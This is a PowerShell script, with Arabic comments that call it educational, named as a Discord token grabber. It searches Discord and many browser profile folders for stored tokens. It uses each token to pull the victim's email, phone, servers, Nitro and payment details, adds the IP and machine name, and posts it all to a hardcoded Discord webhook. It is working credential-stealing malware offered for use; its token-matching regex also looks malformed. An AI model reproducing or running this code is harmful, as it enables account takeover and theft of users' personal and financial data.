# DiscordTokenGrabber.ps1
# هذا السكربت مخصص لأغراض تعليمية فقط لتعليم المبتدئين في PowerShell
# تحذير: يجب استخدام هذا الكود بشكل أخلاقي ومسؤول في بيئات اختبار

# التحقق من أن النظام هو Windows
if ($PSVersionTable.Platform -ne "Win32NT") {
    Write-Host "هذا السكربت يتطلب نظام Windows. جارٍ الخروج..."
    exit
}

# دالة للتحقق من وجود الوحدات (Modules)
function Install-ModuleIfNeeded {
    param($ModuleName)
    if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
        Write-Host "الوحدة $ModuleName غير موجودة. يرجى تثبيتها يدويًا عبر 'Install-Module $ModuleName'."
        exit
    }
}

# التحقق من وحدة الأمان (للتشفير لاحقًا)
Install-ModuleIfNeeded -ModuleName "Microsoft.PowerShell.Security"

# تعريف المتغيرات البيئية
$LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")

# تعريف المسارات في هاش تيبل (مثل القاموس في Python)
$PATHS = @{
    "Discord" = "$ROAMING\discord"
    "Discord Canary" = "$ROAMING\discordcanary"
    "Lightcord" = "$ROAMING\Lightcord"
    "Discord PTB" = "$ROAMING\discordptb"
    "Opera" = "$ROAMING\Opera Software\Opera Stable"
    "Opera GX" = "$ROAMING\Opera Software\Opera GX Stable"
    "Amigo" = "$LOCAL\Amigo\User Data"
    "Torch" = "$LOCAL\Torch\User Data"
    "Kometa" = "$LOCAL\Kometa\User Data"
    "Orbitum" = "$LOCAL\Orbitum\User Data"
    "CentBrowser" = "$LOCAL\CentBrowser\User Data"
    "7Star" = "$LOCAL\7Star\7Star\User Data"
    "Sputnik" = "$LOCAL\Sputnik\Sputnik\User Data"
    "Vivaldi" = "$LOCAL\Vivaldi\User Data\Default"
    "Chrome SxS" = "$LOCAL\Google\Chrome SxS\User Data"
    "Chrome" = "$LOCAL\Google\Chrome\User Data\Default"
    "Epic Privacy Browser" = "$LOCAL\Epic Privacy Browser\User Data"
    "Microsoft Edge" = "$LOCAL\Microsoft\Edge\User Data\Default"
    "Uran" = "$LOCAL\uCozMedia\Uran\User Data\Default"
    "Yandex" = "$LOCAL\Yandex\YandexBrowser\User Data\Default"
    "Brave" = "$LOCAL\BraveSoftware\Brave-Browser\User Data\Default"
    "Iridium" = "$LOCAL\Iridium\User Data\Default"
}

# دالة لإنشاء رؤوس HTTP
function Get-Headers {
    param($Token = $null)
    $headers = @{
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if ($Token) {
        $headers["Authorization"] = $Token
    }
    return $headers
}

# دالة لاستخراج الرموز المميزة (Tokens)
function Get-Tokens {
    param($Path)
    $Path = "$Path\Local Storage\leveldb\"
    $tokens = @()

    if (-not (Test-Path $Path)) {
        Write-Host "المسار $Path غير موجود."
        return $tokens
    }

    $files = Get-ChildItem -Path $Path -File | Where-Object { $_.Extension -eq ".ldb" -or $_.Extension -eq ".log" }
    foreach ($file in $files) {
        if ($file.Extension -eq ".log") { continue }
        try {
            $content = Get-Content -Path "$Path\$($file.Name)" -ErrorAction Ignore
            foreach ($line in $content) {
                $matches = $line | Select-String -Pattern "dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
                if ($matches) {
                    $tokens += $matches.Matches.Groups[1].Value
                }
            }
        } catch {
            Write-Host "خطأ في الوصول إلى الملف: $($file.Name)"
        }
    }
    return $tokens
}

# دالة لاستخراج مفتاح التشفير
function Get-Key {
    param($Path)
    try {
        $localState = Get-Content -Path "$Path\Local State" -ErrorAction Stop | ConvertFrom-Json
        return $localState.os_crypt.encrypted_key
    } catch {
        Write-Host "خطأ في قراءة ملف Local State: $_"
        return $null
    }
}

# دالة لجلب عنوان IP
function Get-IP {
    try {
        $response = Invoke-WebRequest -Uri "https://api.ipify.org?format=json" -ErrorAction Stop
        return ($response.Content | ConvertFrom-Json).ip
    } catch {
        Write-Host "خطأ في جلب عنوان IP: $_"
        return "غير متوفر"
    }
}

# الدالة الرئيسية
function Main {
    $checked = @()

    foreach ($platform in $PATHS.Keys) {
        $path = $PATHS[$platform]
        if (-not (Test-Path $path)) {
            Write-Host "المسار $path غير موجود."
            continue
        }

        foreach ($token in (Get-Tokens -Path $path)) {
            $token = $token -replace "\\", ""
            if ($token -in $checked) { continue }
            $checked += $token

            try {
                # ملاحظة: فك التشفير يتطلب مكتبات خارجية أو .NET
                # لأغراض تعليمية، سنفترض أن الرمز جاهز (stubbed)
                $headers = Get-Headers -Token $token
                $userResponse = Invoke-WebRequest -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
                if ($userResponse.StatusCode -ne 200) {
                    Write-Host "رمز غير صالح: $token"
                    continue
                }
                $userData = $userResponse.Content | ConvertFrom-Json

                # معالجة الأعلام (Badges)
                $badges = ""
                $flags = $userData.flags
                if ($flags -eq 64 -or $flags -eq 96) { $badges += ":BadgeBravery: " }
                if ($flags -eq 128 -or $flags -eq 160) { $badges += ":BadgeBrilliance: " }
                if ($flags -eq 256 -or $flags -eq 288) { $badges += ":BadgeBalance: " }

                # جلب معلومات السيرفرات
                $guildResponse = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true" -Headers $headers -ErrorAction Stop
                $guilds = $guildResponse.Content | ConvertFrom-Json
                $guildCount = $guilds.Count
                $guildInfos = ""
                foreach ($guild in $guilds) {
                    if ($guild.permissions -band 8 -or $guild.permissions -band 32) {
                        $guildDetail = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/guilds/$($guild.id)" -Headers $headers -ErrorAction Stop
                        $guildDetailData = $guildDetail.Content | ConvertFrom-Json
                        $vanity = if ($guildDetailData.vanity_url_code) { "; .gg/$($guildDetailData.vanity_url_code)" } else { "" }
                        $guildInfos += "`nㅤ- [$($guild.name)]: $($guild.approximate_member_count)$vanity"
                    }
                }
                if (-not $guildInfos) { $guildInfos = "لا توجد سيرفرات" }

                # جلب معلومات Nitro
                $nitroResponse = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me/billing/subscriptions" -Headers $headers -ErrorAction Stop
                $nitroData = $nitroResponse.Content | ConvertFrom-Json
                $hasNitro = $nitroData.Count -gt 0
                $expDate = if ($hasNitro) { 
                    $date = [datetime]::Parse($nitroData[0].current_period_end)
                    $date.ToString("dd/MM/yyyy 'في' HH:mm:ss")
                } else { "غير متوفر" }

                # جلب معلومات التعزيز (Boosts)
                $boostResponse = Invoke-WebRequest -Uri "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots" -Headers $headers -ErrorAction Stop
                $boostData = $boostResponse.Content | ConvertFrom-Json
                $available = 0
                $printBoost = ""
                $boost = $false
                foreach ($boostItem in $boostData) {
                    $cooldown = [datetime]::Parse($boostItem.cooldown_ends_at)
                    if ($cooldown -lt [datetime]::Now) {
                        $printBoost += "ㅤ- متاح الآن`n"
                        $available++
                    } else {
                        $printBoost += "ㅤ- متاح في $($cooldown.ToString('dd/MM/yyyy في HH:mm:ss'))`n"
                    }
                    $boost = $true
                }
                if ($boost) { $badges += ":BadgeBoost: " }

                # جلب معلومات الدفع
                $paymentResponse = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me/billing/payment-sources" -Headers $headers -ErrorAction Stop
                $paymentData = $paymentResponse.Content | ConvertFrom-Json
                $paymentMethods = $paymentData.Count
                $validMethods = ($paymentData | Where-Object { -not $_.invalid }).Count
                $paymentTypes = ($paymentData | ForEach-Object { 
                    if ($_.type -eq 1) { "CreditCard" } 
                    elseif ($_.type -eq 2) { "PayPal" } 
                }) -join " "

                # إنشاء الـ Embed لإرسال البيانات
                $embed = @{
                    embeds = @(
                        @{
                            title = "بيانات مستخدم جديد: $($userData.username)"
                            description = @"
```yaml
معرف المستخدم: $($userData.id)
البريد الإلكتروني: $($userData.email)
رقم الهاتف: $($userData.phone)
عدد السيرفرات: $guildCount
صلاحيات الإدارة: $guildInfos
``` 
```yaml
التحقق الثنائي: $($userData.mfa_enabled)
الأعلام: $badges
اللغة: $($userData.locale)
التحقق: $($userData.verified)
```
معلومات Nitro:
```yaml
يمتلك Nitro: $hasNitro
تاريخ الانتهاء: $expDate
التعزيزات المتاحة: $available
$printBoost
```
طرق الدفع:
```yaml
العدد: $paymentMethods
الطرق الصالحة: $validMethods
النوع: $paymentTypes
```
```yaml
عنوان IP: $(Get-IP)
اسم المستخدم: $env:UserName
اسم الجهاز: $env:COMPUTERNAME
موقع الرمز: $platform
```
الرمز:
```yaml
$token
```
"@
                            color = 3092790
                            footer = @{ text = "تم الإنشاء بواسطة Astraa ・ https://github.com/astraadev" }
                            thumbnail = @{ url = "https://cdn.discordapp.com/avatars/$($userData.id)/$($userData.avatar).png" }
                        }
                    )
                    username = "Grabber"
                    avatar_url = "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                # إرسال البيانات إلى Webhook
                $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7" # استبدل هذا برابط Webhook الخاص بك
                Invoke-WebRequest -Uri $webhookUrl -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -Headers (Get-Headers) -ErrorAction Stop
            } catch {
                Write-Host "خطأ في معالجة الرمز: $_"
            }
        }
    }
}

# تشغيل السكربت
Main
